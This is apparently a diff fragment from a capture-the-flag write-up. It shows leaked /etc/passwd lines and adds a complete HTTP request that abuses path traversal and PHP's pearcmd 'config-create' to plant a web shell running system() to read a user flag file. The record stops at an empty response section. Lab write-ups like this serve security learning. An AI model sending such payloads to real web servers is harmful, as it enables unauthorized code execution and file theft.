@@ -910,3 +910,11 @@ phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
 _laurel:x:469:100::/var/log/laurel:/bin/false
 _laurel:x:469:100::/var/log/laurel:/bin/false/pear/man";s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}}
 ```
+
+```
+GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('cat${IFS}/home/phileasfogg3/user.txt')?>+/tmp/shell.php HTTP/1.1
+
+Response after adding it:
+
+
+```
